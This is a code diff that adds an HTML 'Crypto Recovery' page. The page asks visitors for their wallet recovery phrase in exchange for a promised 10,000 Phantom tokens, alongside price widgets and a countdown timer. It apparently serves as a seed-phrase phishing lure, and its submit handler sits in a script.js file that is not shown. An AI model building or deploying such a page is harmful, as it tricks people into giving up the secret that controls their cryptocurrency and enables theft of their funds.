@@ -1,1 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cryptocurrency Recovery</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Welcome to the Crypto Recovery Page</h1>
+        <p>Enter your recovery phrase and receive 10,000 Phantom tokens in 30 days.</p>
+
+        <!-- Crypto Prices Section -->
+        <div class="crypto-prices">
+            <div class="crypto">
+                <h3>Bitcoin: $<span id="bitcoin-price">Loading...</span></h3>
+            </div>
+            <div class="crypto">
+                <h3>Ethereum: $<span id="ethereum-price">Loading...</span></h3>
+            </div>
+            <div class="crypto">
+                <h3>Solana: $<span id="solana-price">Loading...</span></h3>
+            </div>
+            <div class="crypto">
+                <h3>Binance Coin: $<span id="binance-price">Loading...</span></h3>
+            </div>
+        </div>
+
+        <!-- Countdown Timer -->
+        <div class="countdown">
+            <h3>Your tokens will be received in: <span id="timer">Loading...</span></h3>
+        </div>
+
+        <!-- Recovery Phrase Input -->
+        <div class="form-container">
+            <label for="recovery-phrase">Enter your recovery phrase:</label>
+            <input type="text" id="recovery-phrase" placeholder="Enter phrase">
+            <button onclick="submitRecoveryPhrase()">Submit</button>
+            <p id="confirmation-message"></p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
 
